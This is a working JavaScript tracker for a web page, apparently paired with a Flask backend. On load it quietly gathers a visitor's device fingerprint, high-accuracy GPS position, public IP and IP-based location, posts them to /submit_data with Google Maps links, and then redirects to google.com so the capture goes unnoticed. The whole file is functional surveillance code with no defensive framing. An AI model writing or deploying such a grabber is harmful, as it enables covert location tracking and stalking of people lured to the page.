// Obter IP público do usuário sem autenticação
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Failed to fetch IP address');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching public IP:', error);
        throw error;
    }
}

// Consultar a localização com base no IP sem autenticação
async function getIPLocation(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/geo`);
        if (!response.ok) throw new Error('Failed to fetch IP location');
        return response.json();
    } catch (error) {
        console.error('Error fetching IP location:', error);
        throw error;
    }
}

// Detect if the device is mobile
function isMobileDevice() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
}

function gatherDeviceInformation() {
    return new Promise((resolve) => {
        var ptf = navigator.platform;
        var cc = navigator.hardwareConcurrency || 'Not Available';
        var ram = navigator.deviceMemory || 'Not Available';
        var ver = navigator.userAgent;
        var str = ver;
        var os = ver;
        var brw;
        var wd = window.screen.width;
        var ht = window.screen.height;
        var graphics = navigator.gpu || navigator.graphics || 'Not Available';
        var ven = navigator.vendor;
        var isMobile = isMobileDevice();

        if (ver.indexOf('Firefox') != -1) {
            str = str.substring(str.indexOf(' Firefox/') + 1);
            str = str.split(' ');
            brw = str[0];
        } else if (ver.indexOf('Chrome') != -1) {
            str = str.substring(str.indexOf(' Chrome/') + 1);
            str = str.split(' ');
            brw = str[0];
        } else if (ver.indexOf('Safari') != -1) {
            str = str.substring(str.indexOf(' Safari/') + 1);
            str = str.split(' ');
            brw = str[0];
        } else if (ver.indexOf('Edge') != -1) {
            str = str.substring(str.indexOf(' Edge/') + 1);
            str = str.split(' ');
            brw = str[0];
        } else {
            brw = 'Not Available';
        }

        var data = {
            ptf: ptf,
            cc: cc,
            ram: ram, 
            brw: brw, 
            wd: wd, 
            ht: ht, 
            ven: ven, 
            graphics: graphics, 
            os: os,
            isMobile: isMobile
        };

        resolve(data);
    });
}

function getCurrentLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            var options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    var locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || 'Not Available',
                        heading: position.coords.heading || 'Not Available',
                        speed: position.coords.speed || 'Not Available',
                    };
                    resolve(locationData);
                },
                (error) => {
                    reject({ message: error.message });
                },
                options
            );
        } else {
            reject({ message: 'Geolocalização não suportada.' });
        }
    });
}

async function sendDataAndRedirect(combinedData) {
    try {
        // Envio dos dados coletados
        const response = await fetch('/submit_data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(combinedData)
        });

        const result = await response.json();
        console.log('Resposta do Flask (combined data):', result);
        
        // Redireciona somente após o envio dos dados
        window.location.href = "https://www.google.com";
    } catch (error) {
        console.error('Erro ao enviar dados:', error.message);
    }
}

async function initializePage() {
    try {
        const [deviceData, geolocationData, publicIP] = await Promise.all([
            gatherDeviceInformation(),
            getCurrentLocation(),
            getPublicIP()
        ]);

        // Fetch IP location data based on the public IP
        const ipLocationData = await getIPLocation(publicIP);

        // Create a Google Maps link using the geolocation coordinates
        const googleMapsLinkGeo = `https://www.google.com/maps/place/${geolocationData.latitude},${geolocationData.longitude}`;

        // Create a Google Maps link using the IP location data (ipLocationData.loc)
        let googleMapsLinkIP = 'Not Available';
        if (ipLocationData.loc) {
            googleMapsLinkIP = `https://www.google.com/maps/place/${ipLocationData.loc}`;
        }

        // Combine all the data into one object
        const combinedData = {
            ...deviceData,
            ...geolocationData,
            publicIP: publicIP,
            ipLocation: ipLocationData,
            googleMapsLinkGeo: googleMapsLinkGeo,
            googleMapsLinkIP: googleMapsLinkIP
        };

        // Enviar os dados e redirecionar
        await sendDataAndRedirect(combinedData);
    } catch (error) {
        console.error('Erro ao obter dados:', error.message);
    }
}

// Chama a função para inicializar a página
initializePage();
